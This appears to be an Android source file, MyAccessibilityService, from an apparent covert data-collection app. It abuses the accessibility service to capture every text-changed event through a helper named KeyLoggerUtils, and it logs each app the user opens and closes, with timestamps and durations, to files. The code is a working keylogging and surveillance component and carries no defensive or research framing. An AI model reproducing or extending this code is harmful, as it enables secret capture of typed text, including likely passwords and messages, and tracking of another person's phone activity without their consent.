package com.vikasyadavnsit.cdc.services;

import static com.vikasyadavnsit.cdc.utils.KeyLoggerUtils.processTextChangedEvent;

import android.accessibilityservice.AccessibilityService;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Build;
import android.provider.Settings;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.enums.FileMap;
import com.vikasyadavnsit.cdc.receiver.ResetBroadcastReceiver;
import com.vikasyadavnsit.cdc.utils.FileUtils;
import com.vikasyadavnsit.cdc.utils.LoggerUtils;

import java.time.LocalDateTime;
import java.util.HashMap;
import java.util.Map;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "AppUsageService";
    private static Map<String, Long> appStartTimes = new HashMap<>();
    private static Map<String, Long> appUsageTimes = new HashMap<>();
    private static Map<String, Integer> appOpenCounts = new HashMap<>();
    private static String lastPackageName = "";

    private static boolean isTextChangedEvent(AccessibilityEvent event) {
        return event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                || event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Handle accessibility events, such as keystrokes / text changed events
        if (isTextChangedEvent(event)) {
            processTextChangedEvent(event);
        } else if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence packageName = event.getPackageName();
            if (packageName != null) {
                String currentPackageName = packageName.toString();
                long currentTime = System.currentTimeMillis();

                if (!currentPackageName.equals(lastPackageName) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    if (!lastPackageName.isEmpty() && appStartTimes.containsKey(lastPackageName)) {
                        long startTime = appStartTimes.remove(lastPackageName);
                        long usageTime = currentTime - startTime;
                        appUsageTimes.put(lastPackageName, appUsageTimes.getOrDefault(lastPackageName, 0L) + usageTime);
                        FileUtils.appendDataToFile(FileMap.APPLICATION_USAGE, "App closed: " + lastPackageName + " at : " + LocalDateTime.now() + ", used for: " + usageTime + " ms");
                    }

                    FileUtils.appendDataToFile(FileMap.APPLICATION_USAGE, "App opened: " + currentPackageName + " at : " + LocalDateTime.now());
                    appStartTimes.put(currentPackageName, currentTime);
                    appOpenCounts.put(currentPackageName, appOpenCounts.getOrDefault(currentPackageName, 0) + 1);
                    lastPackageName = currentPackageName;
                }
            }
        }
    }

    @Override
    public void onServiceConnected() {
        LoggerUtils.d("MyAccessibilityService", "Service Connected");
        if (canScheduleExactAlarms()) {
            //scheduleDailyReset();
            Intent serviceIntent = new Intent(this, ResetService.class);
            serviceIntent.setAction(AppConstants.ACTION_APPLICATION_RESET_USAGE);
            startService(serviceIntent);
        } else {
            requestExactAlarmPermission();
        }
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        //LoggerUtils.d("AccessibilityService", "Key Event Received: ${event?.keyCode}");
        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {
        // Handle interruption, if necessary
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        printDailyUsageStatic();
    }

//    public void scheduleDailyReset() {
//        Intent intent = new Intent(this, ResetBroadcastReceiver.class);
//        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
//
//        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
//
//        long currentTime = System.currentTimeMillis();
//        long midnight = currentTime + (24 * 60 * 60 * 1000) - (currentTime % (24 * 60 * 60 * 1000));
//
//        try {
//            alarmManager.setExact(AlarmManager.RTC_WAKEUP, 5000, pendingIntent);
//        } catch (SecurityException e) {
//            LoggerUtils.d(TAG, "Failed to schedule exact alarm: " + e.getMessage());
//        }
//    }

    public boolean canScheduleExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            return alarmManager.canScheduleExactAlarms();
        }
        return true; // For older versions, exact alarms are always allowed
    }

    public void requestExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
    }

    public static void printDailyUsageStatic() {
        for (Map.Entry<String, Long> entry : appUsageTimes.entrySet()) {
            String packageName = entry.getKey();
            long usageTime = entry.getValue();
            int openCount = appOpenCounts.getOrDefault(packageName, 0);
            FileUtils.appendDataToFile(FileMap.APPLICATION_USAGE, "App: " + packageName + " used for: " + usageTime + " ms, opened: " + openCount + " times.");
        }
    }

    public static void resetUsageDataStatic() {
        appUsageTimes.clear();
        appOpenCounts.clear();
        lastPackageName = "";
        appStartTimes.clear();
        LoggerUtils.d("MyAccessibilityService", "Usage data reset ");
    }
}
